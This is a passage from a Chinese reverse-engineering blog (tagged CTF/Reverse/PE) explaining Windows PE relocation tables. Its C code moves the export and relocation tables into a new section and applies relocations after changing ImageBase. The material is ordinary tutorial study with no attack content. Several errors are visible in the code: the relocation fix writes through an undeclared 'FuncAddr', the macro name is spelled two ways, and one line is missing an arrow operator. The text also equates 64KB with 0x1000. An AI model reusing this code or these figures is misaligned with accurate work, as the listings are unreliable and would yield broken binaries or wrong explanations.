+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>) + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>DWORD Export_DATA_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br>DWORD Export_DATA_FOA = RVA_TO_FOA(Export_DATA_RVA, Buffer);<br>PIMAGE_EXPORT_DIRECTORY Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Export_DATA_FOA + Buffer);<br><br>    <span class="hljs-comment">//用来记录在新节区中偏移，就是已经复制了多少个字节</span><br>    DWORD index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span>* New_Sec = New_SectionHeader-&gt;PointerToRawData + Buffer;<br><br>    <span class="hljs-comment">//定位到函数地址表，使用char*类型指针即可，因为不需要对其具体求值，只需要按字节复制</span><br>    <span class="hljs-type">char</span>* AddressOfFunctions = Buffer + RVA_TO_FOA(Export_Table-&gt;AddressOfFunctions,Buffer);<br>    <span class="hljs-comment">//复制函数地址表，每个地址表表项都占4个字节</span><br>    <span class="hljs-built_in">memcpy</span>(New_Sec, AddressOfFunctions, Export_Table-&gt;NumberOfFunctions * <span class="hljs-number">4</span>);<br>    <span class="hljs-comment">//修正导出表AddressOfFunctions地址，使其指向新函数地址表 注意是RVA 这里就是新节区起始RVA</span><br>    Export_Table-&gt;AddressOfFunctions = New_SectionHeader-&gt;VirtualAddress + index;<br>    <span class="hljs-comment">//记录已经copy多少字节</span><br>    index += Export_Table-&gt;NumberOfFunctions * <span class="hljs-number">4</span>;<br>    <br>    <span class="hljs-comment">//定位到序号表，同理使用char*类型指针</span><br>    <span class="hljs-type">char</span>* AddressOfOrdinals = Buffer + RVA_TO_FOA(Export_Table-&gt;AddressOfNameOrdinals,Buffer);<br><br>    <span class="hljs-comment">//复制序号表</span><br>    <span class="hljs-built_in">memcpy</span>(New_Sec + index, AddressOfOrdinals, Export_Table-&gt;NumberOfNames * <span class="hljs-number">2</span>);<br>    <span class="hljs-comment">//修正导出表AddressOfNameOrdinals，使其指向新序号表，也是RVA</span><br>    Export_Table-&gt;AddressOfNameOrdinals = New_SectionHeader-&gt;VirtualAddress + index;<br>    <span class="hljs-comment">//记录目前总共已经copy多少字节</span><br>    index += Export_Table-&gt;NumberOfNames * <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">//名称表实现稍显复杂，因为还需要copy名称表对应的名字</span><br>    <span class="hljs-comment">//定位到名称表</span><br>    <span class="hljs-type">char</span>* AddressOfNames = Buffer + RVA_TO_FOA(Export_Table-&gt;AddressOfNames,Buffer);<br>    <span class="hljs-comment">//新节中 名称表起始地址</span><br>    <span class="hljs-type">char</span>* AddressOfNames_FIX = New_Sec + index;<br>    <span class="hljs-comment">//修复导出表AddressOfNames，使其指向新名称表</span><br>    Export_Table-&gt;AddressOfNames = New_SectionHeader-&gt;VirtualAddress + index;<br>    <br>    <span class="hljs-comment">//指向后面的空白区，开始复制名字</span><br>    index += Export_Table-&gt;NumberOfNames * <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-comment">//复制名字//AddressOfNames在定义时使用的char*类型，这里取值需要转为DWORD*型</span><br>        <span class="hljs-type">char</span>* name = Buffer + RVA_TO_FOA(*((DWORD*)AddressOfNames + i),Buffer);<br>        <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>        <span class="hljs-comment">//+1是因为要把字符串后面的0也复制过去，当然不复制也是可以的，因为创建新节区时就已经全部初始为0</span><br>        <span class="hljs-built_in">memcpy</span>(New_Sec + index,name,len+<span class="hljs-number">1</span>);<br><span class="hljs-comment">//这里时修复名称表表项的地址，在根据原表项找到并复制名字后就要把表项给修正为新复制的地址，这里就是FOA转RVA了</span><br>        *((DWORD*)AddressOfNames_FIX + i) = FOA_TO_RVA((New_Sec + index) - Buffer,Buffer);<br>        <span class="hljs-comment">//这里必须加1，因为字符串结束地址一定为0</span><br>        index += len + <span class="hljs-number">1</span>;<br>    &#125;<br>    <br><span class="hljs-comment">//这里开始复制导出表数据</span><br>    <span class="hljs-type">int</span> Size_Of_Exportable = <span class="hljs-keyword">sizeof</span>(IMAGE_EXPORT_DIRECTORY);<br>    <span class="hljs-built_in">memcpy</span>(New_Sec + index,Export_Table,Size_Of_Exportable);<br>    <span class="hljs-comment">//这里就是修复原目录项</span><br>    OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress = New_SectionHeader-&gt;VirtualAddress + index;<br>    <br>    Export_Table_INFO(Buffer);<br>    <span class="hljs-keyword">return</span> Buffer;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="移动重定位表"><a href="#移动重定位表" class="headerlink" title="移动重定位表"></a>移动重定位表</h2><p>重定位表结构比导出表结构简单许多，只需要把目录项的VirtualAddress指向新节区，并把重定位表数据copy到新节区即可</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307120116122.png"></p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Move_RelocTable</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER New_SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br>New_SectionHeader=(PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER +IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>) + FILEHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-comment">//定位到重定位表</span><br>    DWORD Reloc_RVA = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>    DWORD Reloc_FOA = RVA_TO_FOA(Reloc_RVA,Buffer); <br>    PIMAGE_BASE_RELOCATION Reloc_Table = (PIMAGE_BASE_RELOCATION)(Buffer + Reloc_FOA);<br><span class="hljs-comment">//记录新节区偏移</span><br>    DWORD index = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">//结束标志</span><br>    <span class="hljs-keyword">while</span>(Reloc_Table-&gt;VirtualAddress &amp;&amp; Reloc_Table-&gt;SizeOfBlock)&#123;<br>        <span class="hljs-comment">//直接复制即可</span><br>        <span class="hljs-built_in">memcpy</span>(New_SectionHeader-&gt;PointerToRawData + Buffer + index,Reloc_Table,Reloc_Table-&gt;SizeOfBlock);<br>        <span class="hljs-comment">//记录复制了多少字节</span><br>        index += Reloc_Table-&gt;SizeOfBlock;<br>        <span class="hljs-comment">//继续复制下张重定位表</span><br>        Reloc_Table = (PIMAGE_BASE_RELOCATION) (((byte*)(Reloc_Table) + Reloc_Table-&gt;SizeOfBlock));<br>    &#125;<br><span class="hljs-comment">//修正目录项的VirtualAddress</span><br>    OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = New_SectionHeader-&gt;VirtualAddress;<br><br>    <span class="hljs-keyword">return</span> Buffer;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="修复重定位表"><a href="#修复重定位表" class="headerlink" title="修复重定位表"></a>修复重定位表</h2><p>前面提及，重定位表是在PE文件无法按照语句ImageBase装载时发挥作用，那么我们就可以手动来改一改PE文件的ImageBase然后自己来修复那些地址。</p><p>比如说一个重定位表的VisualAddress是0x1000，它其中一个数据项有效值是0x12，那么就说明RVA0x1012处有一个需要修复的地址，需要根据实际ImageBase来重新计算。</p><p>那么我们这里修改了ImageBase，就相当于模拟了无法按照ImageBase来装载，我们就得按照重定位表去找那些需要修改的地址，来重新计算。比如我们给ImageBase增加0x100000，那么所有的那些需要修改的地址都一起增加0x100000</p><p>NOTE：重定位表是记录需要修改地址的表，其本身是不需要修改的。</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><p>INCREATEMENT是我定义的一个宏，作为ImageBase修改的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">Reloc_Fix</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//定位到重定位表</span><br>DWORD Reloc_RVA = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>    DWORD Reloc_FOA = RVA_TO_FOA(Reloc_RVA,Buffer);<br>    PIMAGE_BASE_RELOCATION Reloc_Table = (PIMAGE_BASE_RELOCATION)(Buffer + Reloc_FOA);<br>    <span class="hljs-comment">//手动更改ImageBase</span><br>    OptionalHeader-&gt;ImageBase =OptionalHeader-&gt;ImageBase + INCREATIMENT;<br><br>    <span class="hljs-keyword">while</span>(Reloc_Table-&gt;VirtualAddress &amp;&amp; Reloc_Table-&gt;SizeOfBlock)&#123;<br>        <span class="hljs-comment">//定位到重定位表的数据项</span><br>        WORD* Reloc_Add = (WORD*)((<span class="hljs-type">char</span>*)Reloc_Table + <span class="hljs-number">8</span>);<br>        <span class="hljs-comment">//数据项项数</span><br>        DWORD RealSize =( Reloc_Table-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; RealSize ; i++)&#123;<br>            <span class="hljs-comment">//数据项低12位是偏移</span><br>            DWORD Offset = (*(Reloc_Add + i) )&amp; <span class="hljs-number">0x0fff</span>;<br>            <span class="hljs-comment">//VirtualAddress是基址，与数据项低12位一起组成地址</span><br>            DWORD Base = Reloc_Table-&gt;VirtualAddress;<br>            <span class="hljs-comment">//找到需要修改的地址</span><br>            DWORD* Addr = (DWORD*)(RVA_TO_FOA(Base + Offset,Buffer) + Buffer);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Beferoe: %x &quot;</span>,*Addr);<br>            <span class="hljs-comment">//进行重定位，也就是根据ImageBase进行修复</span><br>            *FuncAddr =*Addr + INCREATIMENT;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After: %x\n&quot;</span>,*Addr);<br>        &#125;<br><span class="hljs-comment">//继续下一个重定位表</span><br>        Reloc_Table =(PIMAGE_BASE_RELOCATION) ((<span class="hljs-type">char</span>*)Reloc_Table + Reloc_Table-&gt;SizeOfBlock);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（八）</title>
    <link href="/2023/07/09/PE_7/"/>
    <url>/2023/07/09/PE_7/</url>
    
    <content type="html"><![CDATA[<p>重定位表</p><span id="more"></span><h2 id="程序装载过程"><a href="#程序装载过程" class="headerlink" title="程序装载过程"></a>程序装载过程</h2><p>当我们双击一个exe的时候，操作系统会自动为这个exe分配4GB独立的虚拟空间，其中高2G作为运行操作系统内核任务，低2G才运行用户的代码。在拥有这个4GB空间后，操作系统就会把这个exe从文件状态拉伸然后复制到低2G空间中</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082336465.png"></p><p>而后则是copy系统DLL到高2G中。最后则是将eip置为EntryPoint，就可以运行整个exe了。</p><p>然而这里面有一个问题，就是每个PE文件都会优先按照其自身DLL的ImageBase来装载，那么就无法避免ImageBase冲突的状况。一旦发生ImageBase冲突就需要另找一个地方来装载。可若仅仅只是换一个地方来装载，又会带来另一个问题——地址改变。</p><p>在编译一个文件的时候，编译器往往会把一些全局变量或者函数调用的地址给写死，也就是按照预计的ImageBase来计算地址</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082351108.png"></p><p>比如图中所有的红下划线都对应一个地址，他们都是按照预计的ImageBase来加载计算的，但是如果没有按照ImageBase加载，那么这个地址就一定会有问题。</p><p>解决办法就是记录这些地址，在实际运行的时候根据ImageBase来修正这些地址，那么就需要一张表来记录这些需要修正的地址。这张表就叫做重定位表。</p><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><h3 id="找到重定位表"><a href="#找到重定位表" class="headerlink" title="找到重定位表"></a>找到重定位表</h3><p>重定位表地址位于OptionalHeader的第六项，这个地址也是RVA，将其转化为FOA后就可以找到重定位表</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082358679.png"></p><h3 id="重定位表结构"><a href="#重定位表结构" class="headerlink" title="重定位表结构"></a>重定位表结构</h3><p>重定位表与其他表都有不同，它的结构体只有两个成员，一个记录基地址，一个记录块大小，每个结构体后都跟有许多个两字节数据，然后许多个这样的块紧密连在一起形成一个重定位表。可能你会问基地址是什么？块大小是什么？数据又是什么？下面就来解释每个成员的意义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BASE_RELOCATION</span>&#123;</span><br>DWORD VirtualAddress;<br>DWORD SizeOfBlock;<br>    <span class="hljs-comment">//一堆数据...（如果是最后一个这种结构，就只有RVA和SizeOfBlock，且都为0）</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307090001337.png"></p><p>可以这么理解：一个重定位表中可能会有多个“块”，每个块的结构都是</p><ul><li>4字节VirtualAddress</li><li>接着4字节SizeOfBlock</li><li>最后是一堆数据，称其为具体项</li><li>每个块的大小为SizeOfBlock（字节）。</li></ul><p>最后一个块的RVA和SizeOfBlock都是0x00000000，表示重定位表结束</p><p>在一个exe中，需要重定位的地址可能有很多个，每个地址都是4字节，如果全部都完完全全按照4字节来存储，显然会占据很多空间。但是稍微观察一下会发现，许多需要重定位的地址都比较相近，比如上面所举的例子。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082351108.png"></p><p>在图中需要重定位的地址就是 <code>6DF03</code>,<code>6DF0B</code>,<code>6DF1A</code>等等（注意是需要重定位的地址，操作码是不需要改变的），它们都是<code>6D</code>开头，就会很自然诞生一种想法就是以<code>6D000</code>为基地址，在基地址上加一个偏移来找到具体的需要重定位的地址。那么这个基地址就是<code>VirtualAddres</code>，偏移则记录在结构体后的数据中，也就是那些个01数据。</p><p>现在来思考这样一个问题，那些记录偏移的01数据都是两字节的，也就是16位，能够记录 $2^{16} &#x3D; 65536$ 个数据，然而在内存中这些模块间对齐粒度都是64KB即0x1000，也就是所有的基地址都是以0x1000来对齐的。16位的偏移显然超过了这个基地址，只需要用到12位就足以表示一个基地址的所有偏移了。因此16位的偏移数据会多出4位，于是就规定这16位里面高4位为有效位，只有当高四位等于3的时候才说明这个地址需要重定位，低12位则记录偏移。</p><p>因此一个需要重定位的地址就应该这样计算 <code>if 具体项高4位 == 3 ：地址 = VirtualAddress + 具体项低12位</code></p><p>成员SizeOfBlock意义就比较明确了，就是整个块的大小，包括VirtualAddress 的四字节，本身SizeOfBlock的四字节，以及下面的所有具体项的两字节。所以有多少个具体项就应该这样计算：<code>(SizeOfBlock - 8)/2</code>，注意这里的单位都是字节</p><h2 id="代码遍历重定位表"><a href="#代码遍历重定位表" class="headerlink" title="代码遍历重定位表"></a>代码遍历重定位表</h2><p>代码中有注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>    &#123;<br>        <span class="hljs-keyword">return</span> RVA;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>        <span class="hljs-comment">//最后一个节区</span><br>    SectionHeader +=<span class="hljs-number">1</span>;<br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Relocation_INFO</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//在目录项中找到重定位表地址</span><br>    DWORD Relocation_Table_RVA = OptionalHeader&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>    <span class="hljs-keyword">if</span> (!Relocation_Table_RVA)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This exe has not Relocation Table\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br><br>    <span class="hljs-comment">//将重定位表地址转化FOA</span><br>    DWORD Relocation_Table_FOA = RVA_TO_FOA(Relocation_Table_RVA,Buffer);<br><br>    <span class="hljs-comment">//找到第一个重定位表块</span><br>    PIMAGE_BASE_RELOCATION Relocation_Table = (PIMAGE_BASE_RELOCATION)(Buffer + Relocation_Table_FOA);<br><br>    <span class="hljs-comment">//遍历所有重定位表</span><br>    <span class="hljs-keyword">while</span>(Relocation_Table-&gt;VirtualAddress &amp;&amp; Relocation_Table-&gt;SizeOfBlock)&#123;<br>      <span class="hljs-comment">//先转为byte*，加8字节，然后转为Word*，这里就是代表每一个具体项</span><br>        WORD* Reloc = (WORD*)((byte*)Relocation_Table + <span class="hljs-number">8</span>);<br>        <span class="hljs-comment">//算出有多少个据具体项</span><br>        DWORD AddSize =  (Relocation_Table-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><br>        <span class="hljs-comment">//这里是计算需要重定位地址属于哪一个块，可加可不加</span><br>        <span class="hljs-comment">//********************************Section****************************************</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; FileHeader-&gt;NumberOfSections;i++)&#123;<br>            <span class="hljs-keyword">if</span> (Relocation_Table-&gt;VirtualAddress &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; Relocation_Table-&gt;VirtualAddress &lt; (SectionHeader-&gt;VirtualAddress + SectionHeader-&gt;Misc.VirtualSize))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=====%s=====\n&quot;</span>,SectionHeader-&gt;Name);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                SectionHeader += <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//********************************Section****************************************</span><br>        <br>        <span class="hljs-comment">//这里就是遍历所有具体项</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; AddSize; i++)&#123;<br>            <span class="hljs-comment">//高4位是否为3</span><br>            <span class="hljs-keyword">if</span>((*(Reloc + i) &gt;&gt; <span class="hljs-number">12</span> ) == <span class="hljs-number">3</span>)&#123;<br>                <span class="hljs-comment">//计算需要重定位地址的RVA</span><br>                DWORD RVA = Relocation_Table-&gt;VirtualAddress + (*(Reloc + i) &amp; <span class="hljs-number">0xfff</span>);<br>                <span class="hljs-built_in">printf</span>(<span 